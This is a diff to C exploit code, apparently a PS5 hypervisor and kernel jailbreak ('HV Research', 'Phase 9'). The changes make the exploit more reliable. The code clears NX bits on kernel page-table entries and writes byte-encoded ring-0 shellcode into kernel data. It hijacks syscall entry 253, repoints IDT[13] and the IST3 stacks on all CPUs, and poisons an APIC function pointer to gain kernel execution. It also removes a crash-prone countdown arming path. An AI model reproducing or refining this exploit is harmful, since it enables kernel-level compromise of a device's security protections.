@@ -4952,25 +4952,130 @@ static int phase9_ring0_arm_trigger(
     printf("[*] Current CPU has clean TLB (from sleep context switch).\n");
     fflush(stdout);
 
+    /* ── Ensure kdata_base page is executable (NX cleared) ──
+     *
+     * Phase 9 clears NX on the cave page's guest PTE.  If kdata is
+     * mapped as 2MB pages, the cave and kdata_base share the same PDE
+     * and NX is already cleared for both.  But if kdata uses 4KB PTEs,
+     * the cave's NX-clear does NOT cover kdata_base — executing the
+     * arm+trigger shellcode at kdata_base would #PF → panic.
+     *
+     * Walk the guest page tables to find kdata_base's PTE/PDE and
+     * clear NX if it's still set.  Restore after execution. */
+    uint64_t kdata_pte_pa = 0;
+    uint64_t kdata_orig_pte = 0;
+    int kdata_nx_cleared = 0;
+    {
+        uint64_t target = g_kdata_base;
+        uint64_t walk_e, walk_pa;
+
+        /* PML4 */
+        walk_pa = g_cr3_phys + ((target >> 39) & 0x1FF) * 8;
+        kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
+        if (walk_e & PTE_PRESENT) {
+            /* PDP */
+            walk_pa = (walk_e & PTE_PA_MASK) + ((target >> 30) & 0x1FF) * 8;
+            kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
+            if ((walk_e & PTE_PRESENT) && !(walk_e & PTE_PS)) {
+                /* PD */
+                walk_pa = (walk_e & PTE_PA_MASK) + ((target >> 21) & 0x1FF) * 8;
+                kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
+                if (walk_e & PTE_PRESENT) {
+                    if (walk_e & PTE_PS) {
+                        /* 2MB page — PDE is final */
+                        kdata_pte_pa = walk_pa;
+                        kdata_orig_pte = walk_e;
+                    } else {
+                        /* 4KB — walk to PT */
+                        walk_pa = (walk_e & PTE_PA_MASK) + ((target >> 12) & 0x1FF) * 8;
+                        kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
+                        if (walk_e & PTE_PRESENT) {
+                            kdata_pte_pa = walk_pa;
+                            kdata_orig_pte = walk_e;
+                        }
+                    }
+                }
+            }
+        }
+
+        if (kdata_pte_pa && (kdata_orig_pte >> 63)) {
+            /* NX is set — clear it so shellcode can execute */
+            uint64_t new_pte = kdata_orig_pte & ~((1ULL << 63) | (1ULL << 8));
+            kernel_copyin(&new_pte, g_dmap_base + kdata_pte_pa, 8);
+            uint64_t rb;
+            kernel_copyout(g_dmap_base + kdata_pte_pa, &rb, 8);
+            if (rb == new_pte) {
+                kdata_nx_cleared = 1;
+                printf("[+] Cleared NX on kdata_base PTE for arm+trigger shellcode\n");
+                printf("    PTE PA 0x%lx: 0x%016lx → 0x%016lx\n",
+                       (unsigned long)kdata_pte_pa,
+                       (unsigned long)kdata_orig_pte,
+                       (unsigned long)new_pte);
+            } else {
+                printf("[-] Failed to clear NX on kdata_base PTE — aborting.\n");
+                return 0;
+            }
+        } else if (kdata_pte_pa) {
+            printf("[+] kdata_base PTE already NX=0 (shared 2MB PDE or pre-cleared)\n");
+        } else {
+            printf("[-] Could not walk page tables for kdata_base — aborting.\n");
+            return 0;
+        }
+    }
+
+    /* Save ALL CPUs' original IST3 values BEFORE arming.
+     * Each CPU may have a different IST3 pointing to a per-CPU stack.
+     * We need to restore each CPU to its OWN original value, not just
+     * CPU 0's value copied to all CPUs. */
+    uint64_t saved_ist3[NUM_CPUS_P9];
+    for (int cpu = 0; cpu < NUM_CPUS_P9; cpu++) {
+        uint64_t cpu_ist3_dmap = g_dmap_base + tss_pa +
+                                 cpu * TSS_STRIDE_P9 + 0x34;
+        kernel_copyout(cpu_ist3_dmap, &saved_ist3[cpu], 8);
+    }
+    printf("[+] Saved original IST3 for all %d CPUs\n", NUM_CPUS_P9);
+    printf("    CPU 0 IST3: 0x%016lx\n", (unsigned long)saved_ist3[0]);
+    int ist3_all_same = 1;
+    for (int cpu = 1; cpu < NUM_CPUS_P9; cpu++) {
+        if (saved_ist3[cpu] != saved_ist3[0]) {
+            ist3_all_same = 0;
+            printf("    CPU %d IST3: 0x%016lx (DIFFERENT)\n",
+                   cpu, (unsigned long)saved_ist3[cpu]);
+        }
+    }
+    if (ist3_all_same)
+        printf("    All CPUs have same IST3 value\n");
+
     /* Build the arm+trigger shellcode.
      *
      * Layout (runs in ring 0):
      *   invlpg [cave_kva]              — flush 2MB TLB entry
+     *   invlpg [kdata_base]            — flush kdata_base TLB entry too
      *   loop: set IST3 on all 16 CPUs  — DMAP writes
      *   write new IDT[13]              — DMAP write (16 bytes)
      *   write poisoned apic_ops[2]     — DMAP write
      *   call rax (= poisoned)          — triggers #GP → handler → restore
      *   xor eax, eax; ret              — return success
      */
-    uint8_t sc[256];
+    uint8_t sc[512];
     int p = 0;
 
-    /* 1. invlpg [rax] — flush TLB for cave's 2MB page on current CPU */
+    /* 1a. invlpg [rax] — flush TLB for cave's page on current CPU */
     /* movabs rax, cave_kva */
     sc[p++] = 0x48; sc[p++] = 0xB8;
     memcpy(&sc[p], &cave_kva, 8); p += 8;
     /* invlpg [rax] = 0F 01 38 */
     sc[p++] = 0x0F; sc[p++] = 0x01; sc[p++] = 0x38;
+
+    /* 1b. invlpg [rax] — flush TLB for kdata_base (shellcode page) too.
+     *     If kdata uses 4KB PTEs, the cave and kdata_base are different
+     *     TLB entries. Flush both to ensure the NX-clear is effective. */
+    if (cave_kva != g_kdata_base) {
+        uint64_t kdb = g_kdata_base;
+        sc[p++] = 0x48; sc[p++] = 0xB8;
+        memcpy(&sc[p], &kdb, 8); p += 8;
+        sc[p++] = 0x0F; sc[p++] = 0x01; sc[p++] = 0x38;
+    }
 
     /* 2. Set IST3 on all 16 CPUs (loop: mov [rdi], rax; add rdi, stride) */
     /* movabs rax, new_ist3 */
@@ -5055,16 +5160,18 @@ static int phase9_ring0_arm_trigger(
     fflush(stdout);
 
     /* Save original kdata_base content, write shellcode */
-    uint8_t backup[256];
+    uint8_t backup[512];
     kernel_copyout(g_dmap_base + target_pa, backup, p);
     kernel_copyin(sc, g_dmap_base + target_pa, p);
 
     /* Verify shellcode write */
-    uint8_t verify[256];
+    uint8_t verify[512];
     kernel_copyout(g_dmap_base + target_pa, verify, p);
     if (memcmp(sc, verify, p)) {
         printf("[-] Shellcode write verification FAILED.\n");
         kernel_copyin(backup, g_dmap_base + target_pa, p);
+        if (kdata_nx_cleared && kdata_pte_pa)
+            kernel_copyin(&kdata_orig_pte, g_dmap_base + kdata_pte_pa, 8);
         return 0;
     }
     printf("[+] Shellcode written to kdata_base, verified OK\n");
@@ -5075,6 +5182,8 @@ static int phase9_ring0_arm_trigger(
     if (!s253_pa) {
         printf("[-] sysent[253] VA→PA failed.\n");
         kernel_copyin(backup, g_dmap_base + target_pa, p);
+        if (kdata_nx_cleared && kdata_pte_pa)
+            kernel_copyin(&kdata_orig_pte, g_dmap_base + kdata_pte_pa, 8);
         return 0;
     }
     uint8_t s253_orig[SYSENT_STRIDE_P9];
@@ -5098,9 +5207,14 @@ static int phase9_ring0_arm_trigger(
 
     printf("[+] syscall(253) returned: %ld, errno=%d\n", ret, err);
 
-    /* Restore sysent[253] and kdata_base content */
+    /* Restore sysent[253], kdata_base content, and NX bit */
     kernel_copyin(s253_orig, g_dmap_base + s253_pa, SYSENT_STRIDE_P9);
     kernel_copyin(backup, g_dmap_base + target_pa, p);
+    if (kdata_nx_cleared && kdata_pte_pa) {
+        kernel_copyin(&kdata_orig_pte, g_dmap_base + kdata_pte_pa, 8);
+        printf("[+] Restored NX on kdata_base PTE: 0x%016lx\n",
+               (unsigned long)kdata_orig_pte);
+    }
 
     if (ret == 0 && err == 0) {
         printf("[+] ============================================\n");
@@ -5126,21 +5240,15 @@ static int phase9_ring0_arm_trigger(
 
         /* Restore IST3 on ALL CPUs (handler only restored CPU 0).
          * The ring-0 shellcode set IST3 on all 16 CPUs to
-         * cave_kva+0x100.  Stale IST3 values are mostly harmless
-         * (IDT[13] restored to IST=0), but clean up properly to
-         * avoid any edge cases during suspend. */
+         * cave_kva+0x100.  We saved each CPU's original IST3 before
+         * arming, so restore each CPU to its own original value. */
         printf("[*] Restoring IST3 on all %d CPUs...\n", NUM_CPUS_P9);
         for (int cpu = 0; cpu < NUM_CPUS_P9; cpu++) {
             uint64_t cpu_ist3_dmap = g_dmap_base + tss_pa +
                                      cpu * TSS_STRIDE_P9 + 0x34;
-            /* Read original IST3 from the pre-arm state.
-             * Handler already restored CPU 0; for CPUs 1-15,
-             * write the same original value. */
-            uint64_t orig_ist3_val;
-            kernel_copyout(g_dmap_base + tss_pa + 0x34, &orig_ist3_val, 8);
-            kernel_copyin(&orig_ist3_val, cpu_ist3_dmap, 8);
+            kernel_copyin(&saved_ist3[cpu], cpu_ist3_dmap, 8);
         }
-        printf("[+] IST3 restored on all %d CPUs\n", NUM_CPUS_P9);
+        printf("[+] IST3 restored on all %d CPUs (each to its own original)\n", NUM_CPUS_P9);
 
         notify("[HV Research] Phase 9: arm+trigger SUCCESS! Enter rest mode when ready.");
         return 1;
@@ -6736,110 +6844,20 @@ static void campaign_flatz_setup(void) {
                 goto phase9_kld_done;
             }
 
-            /* ── Fallback: Deferred arming countdown ──
+            /* ── Countdown fallback REMOVED ──
              *
-             * WARNING: This path is unreliable!  Idle CPUs may have stale
-             * NX=1 TLB entries for the handler page.  If the first
-             * xapic_mode() call after arming fires on an idle CPU, the
-             * handler instruction fetch faults → triple fault → panic.
+             * The countdown-based arming is unreliable and causes kernel
+             * panics: idle CPUs have stale NX=1 TLB entries for the handler
+             * page, so the first xapic_mode() call on an idle CPU causes
+             * handler instruction fetch fault → triple fault → panic.
              *
-             * Give the user 25 seconds to navigate to rest mode,
-             * THEN arm IDT[13] + IST3 + poison in tight sequence. */
-
-            printf("\n");
-            printf("[!] =====================================================\n");
-            printf("[!]  NAVIGATE TO REST MODE NOW!\n");
-            printf("[!] =====================================================\n");
-            printf("[!]\n");
-            printf("[!]  Press the PS button to exit this plugin, then go to:\n");
-            printf("[!]    Settings → System → Power Saving → Enter Rest Mode\n");
-            printf("[!]\n");
-            printf("[!]  STAY on the rest mode screen and WAIT.\n");
-            printf("[!]  The poison will arm in 25 seconds.\n");
-            printf("[!]  Once armed, IMMEDIATELY enter rest mode.\n");
-            printf("[!] =====================================================\n\n");
+             * Without ring-0 arm+trigger (sysent unavailable), we cannot
+             * safely arm Phase 9.  Skip and report why. */
+            printf("\n[!] Ring-0 arm+trigger failed (sysent unavailable?).\n");
+            printf("[!] Countdown-based arming DISABLED (causes kernel panic).\n");
+            printf("[!] Phase 9 NOT armed.  Investigate sysent discovery.\n");
             fflush(stdout);
-
-            notify("[HV Research] GO NOW: Settings > System > Power Saving > Rest Mode (25s countdown)");
-
-            /* Countdown — user navigates during this window */
-            for (int cd = 25; cd > 0; cd--) {
-                printf("[*] Arming in %d seconds...\n", cd);
-                fflush(stdout);
-                sleep(1);
-            }
-
-            printf("\n[*] ARMING NOW — IST3 (all CPUs) + IDT[13] + poison...\n");
-            fflush(stdout);
-
-            /* ARM Step 1: Set IST3 → cave stack on ALL CPUs.
-             *
-             * CRITICAL: apic_ops[2] is global — any CPU can call xapic_mode().
-             * Each CPU has its own TSS (stride 0x68, 16 CPUs).  If we only
-             * patch CPU 0's IST3 and the #GP fires on another CPU, that CPU
-             * reads IST3=0 from its own TSS → pushes interrupt frame to
-             * address 0 → #PF → double fault → triple fault → panic.
-             *
-             * Patch ALL CPUs' IST3 FIRST (before IDT), so every CPU has a
-             * valid IST3 stack ready before the #GP handler is installed. */
-            #define TSS_STRIDE  0x68
-            #define NUM_CPUS    16
-            for (int cpu = 0; cpu < NUM_CPUS; cpu++) {
-                uint64_t cpu_ist3_dmap = g_dmap_base + tss_pa + cpu * TSS_STRIDE + 0x34;
-                kernel_copyin(&new_ist3, cpu_ist3_dmap, 8);
-            }
-            printf("[+] TSS IST3 → 0x%016lx on all %d CPUs (cave stack, 256 bytes)\n",
-                   (unsigned long)new_ist3, NUM_CPUS);
-
-            /* ARM Step 2: Patch IDT[13] → KLD gp_handler.
-             * IDT is shared across all CPUs — one write covers everyone.
-             * IST3 is already set on all CPUs, so if a spurious #GP fires
-             * between this write and Step 3, the handler has a valid stack. */
-            kernel_copyin(new_idt13, idt13_dmap_addr, 16);
-            printf("[+] IDT[13] → 0x%016lx (KLD gp_handler, IST=3)\n",
-                   (unsigned long)ht);
-
-            /* ARM Step 3: Poison apic_ops[2] — non-canonical → #GP on call */
-            kernel_copyin(&poisoned, g_dmap_base + ops_pa + 2 * 8, 8);
-            printf("[+] apic_ops[2] POISONED: 0x%016lx → 0x%016lx\n",
-                   (unsigned long)original_xapic, (unsigned long)poisoned);
-
-            phase9_armed = 1;
-
-            printf("\n[+] ============================================\n");
-            printf("[+]  PHASE 9 — ARMED (flatz pointer poisoning)\n");
-            printf("[+] ============================================\n");
-            printf("[+]\n");
-            printf("[+]  Handler:      KLD gp_handler at 0x%lx (NPT-exec)\n",
-                   (unsigned long)g_kmod_gp_handler);
-            printf("[+]  Handler PA:   0x%lx\n", (unsigned long)gp_pa);
-            printf("[+]  IDT[13]:      → KLD handler (IST=3)\n");
-            printf("[+]  IST3:         → cave stack at 0x%lx (all %d CPUs)\n",
-                   (unsigned long)new_ist3, NUM_CPUS);
-            printf("[+]  apic_ops[2]:  POISONED (0xdeb7 prefix)\n");
-            printf("[+]  Cave KVA:     0x%lx  PA: 0x%lx\n",
-                   (unsigned long)cave_kva, (unsigned long)cave_pa);
-            printf("[+]  Orig IST3:    0x%lx (will be restored by handler)\n",
-                   (unsigned long)orig_ist3);
-            printf("[+]  Orig xapic:   0x%016lx (will be restored by handler)\n",
-                   (unsigned long)original_xapic);
-            printf("[+]\n");
-            printf("[+]  ENTER REST MODE NOW!\n");
-            printf("[+]\n");
-            printf("[+]  Next xapic_mode() call will trigger:\n");
-            printf("[+]    1. #GP (non-canonical address 0x%016lx)\n",
-                   (unsigned long)poisoned);
-            printf("[+]    2. CPU → IST3 stack → KLD gp_handler\n");
-            printf("[+]    3. Handler restores IDT[13] + apic_ops[2] + IST3\n");
-            printf("[+]    4. iretq re-executes call with valid pointer\n");
-            printf("[+]  System should continue normally after one-shot restore.\n");
-            printf("[+]\n");
-            printf("[+]  NOTE: The 'ARMED' notification may NOT appear if you\n");
-            printf("[+]  are already on the power options screen — PS5 system\n");
-            printf("[+]  overlays suppress notification popups.  The poison IS\n");
-            printf("[+]  armed once the countdown finishes.  Enter rest mode.\n");
-
-            notify("[HV Research] ARMED! Enter rest mode NOW!");
+            notify("[HV Research] Phase 9: arm+trigger unavailable, skipping.");
 phase9_kld_done:
             /* Restore cave PTE (NX=1, G=1) after arm+trigger success */
             if (phase9_armed && cave_pte_pa && cave_orig_pte) {
@@ -6905,103 +6923,20 @@ phase9_kld_done:
                 goto phase9_cave_done;
             }
 
-            /* ── Fallback: Deferred arming countdown ──
+            /* ── Countdown fallback REMOVED ──
              *
-             * WARNING: This path is unreliable!  Idle CPUs may have stale
-             * NX=1 TLB entries for the handler page.  If the first
-             * xapic_mode() call after arming fires on an idle CPU, the
-             * handler instruction fetch faults → triple fault → panic.
+             * The countdown-based arming is unreliable and causes kernel
+             * panics: idle CPUs have stale NX=1 TLB entries for the handler
+             * page, so the first xapic_mode() call on an idle CPU causes
+             * handler instruction fetch fault → triple fault → panic.
              *
-             * Give the user 25 seconds to navigate to rest mode,
-             * THEN arm IDT[13] + IST3 + poison in tight sequence.
-             * The 25-second delay MAY help flush TLBs via context switches
-             * but is NOT reliable for idle CPUs in hlt loops. */
-
-            printf("\n");
-            printf("[!] =====================================================\n");
-            printf("[!]  NAVIGATE TO REST MODE NOW!\n");
-            printf("[!] =====================================================\n");
-            printf("[!]\n");
-            printf("[!]  Press the PS button to exit this plugin, then go to:\n");
-            printf("[!]    Settings → System → Power Saving → Enter Rest Mode\n");
-            printf("[!]\n");
-            printf("[!]  STAY on the rest mode screen and WAIT.\n");
-            printf("[!]  The poison will arm in 25 seconds.\n");
-            printf("[!]  Once armed, IMMEDIATELY enter rest mode.\n");
-            printf("[!] =====================================================\n\n");
+             * Without ring-0 arm+trigger (sysent unavailable), we cannot
+             * safely arm Phase 9.  Skip and report why. */
+            printf("\n[!] Ring-0 arm+trigger failed (sysent unavailable?).\n");
+            printf("[!] Countdown-based arming DISABLED (causes kernel panic).\n");
+            printf("[!] Phase 9 NOT armed.  Investigate sysent discovery.\n");
             fflush(stdout);
-
-            notify("[HV Research] GO NOW: Settings > System > Power Saving > Rest Mode (25s countdown)");
-
-            /* Countdown — user navigates during this window */
-            for (int cd = 25; cd > 0; cd--) {
-                printf("[*] Arming in %d seconds...\n", cd);
-                fflush(stdout);
-                sleep(1);
-            }
-
-            printf("\n[*] ARMING NOW — IST3 (all CPUs) + IDT[13] + poison...\n");
-            fflush(stdout);
-
-            /* ARM Step 1: Set IST3 → cave stack on ALL CPUs.
-             * Same rationale as KLD path — any CPU can call xapic_mode()
-             * and each CPU has its own TSS with its own IST3 field.
-             * Original IST3 is typically 0 (unused by FreeBSD), so an
-             * unpatched CPU would triple-fault on #GP delivery. */
-            for (int cpu = 0; cpu < NUM_CPUS; cpu++) {
-                uint64_t cpu_ist3_dmap = g_dmap_base + tss_pa + cpu * TSS_STRIDE + 0x34;
-                kernel_copyin(&new_ist3, cpu_ist3_dmap, 8);
-            }
-            printf("[+] TSS IST3 → 0x%016lx on all %d CPUs (cave stack, 256 bytes)\n",
-                   (unsigned long)new_ist3, NUM_CPUS);
-
-            /* ARM Step 2: Patch IDT[13] → inline handler */
-            kernel_copyin(new_idt13, idt13_dmap_addr, 16);
-            printf("[+] IDT[13] → 0x%016lx (inline handler, IST=3)\n",
-                   (unsigned long)ht);
-
-            /* ARM Step 3: Poison apic_ops[2] — non-canonical → #GP on call */
-            kernel_copyin(&poisoned, g_dmap_base + ops_pa + 2 * 8, 8);
-            printf("[+] apic_ops[2] POISONED: 0x%016lx → 0x%016lx\n",
-                   (unsigned long)original_xapic, (unsigned long)poisoned);
-
-            phase9_armed = 1;
-
-            printf("\n[+] ============================================\n");
-            printf("[+]  PHASE 9 — ARMED (inline handler, NPT-exec cave)\n");
-            printf("[+] ============================================\n");
-            printf("[+]\n");
-            printf("[+]  Handler:      inline at cave+0x180 (0x%lx)\n",
-                   (unsigned long)handler_kva);
-            printf("[+]  Handler PA:   0x%lx (in NPT-executable 2MB page)\n",
-                   (unsigned long)(cave_pa + 0x180));
-            printf("[+]  Cave KVA:     0x%lx  PA: 0x%lx\n",
-                   (unsigned long)cave_kva, (unsigned long)cave_pa);
-            printf("[+]  IDT[13]:      → inline handler (IST=3)\n");
-            printf("[+]  IST3:         → cave stack at 0x%lx (all %d CPUs)\n",
-                   (unsigned long)new_ist3, NUM_CPUS);
-            printf("[+]  apic_ops[2]:  POISONED (0xdeb7 prefix)\n");
-            printf("[+]  Orig IST3:    0x%lx (will be restored by handler)\n",
-                   (unsigned long)orig_ist3);
-            printf("[+]  Orig xapic:   0x%016lx (will be restored by handler)\n",
-                   (unsigned long)original_xapic);
-            printf("[+]\n");
-            printf("[+]  ENTER REST MODE NOW!\n");
-            printf("[+]\n");
-            printf("[+]  Next xapic_mode() call will trigger:\n");
-            printf("[+]    1. #GP (non-canonical address 0x%016lx)\n",
-                   (unsigned long)poisoned);
-            printf("[+]    2. CPU → IST3 stack → inline handler at cave+0x180\n");
-            printf("[+]    3. Handler restores IDT[13] + apic_ops[2] + IST3\n");
-            printf("[+]    4. iretq re-executes call with valid pointer\n");
-            printf("[+]  System should continue normally after one-shot restore.\n");
-            printf("[+]\n");
-            printf("[+]  NOTE: The 'ARMED' notification may NOT appear if you\n");
-            printf("[+]  are already on the power options screen — PS5 system\n");
-            printf("[+]  overlays suppress notification popups.  The poison IS\n");
-            printf("[+]  armed once the countdown finishes.  Enter rest mode.\n");
-
-            notify("[HV Research] ARMED! Enter rest mode NOW!");
+            notify("[HV Research] Phase 9: arm+trigger unavailable, skipping.");
 phase9_cave_done:
             /* Restore cave PTE (NX=1, G=1) after arm+trigger success */
             if (phase9_armed && cave_pte_pa && cave_orig_pte) {
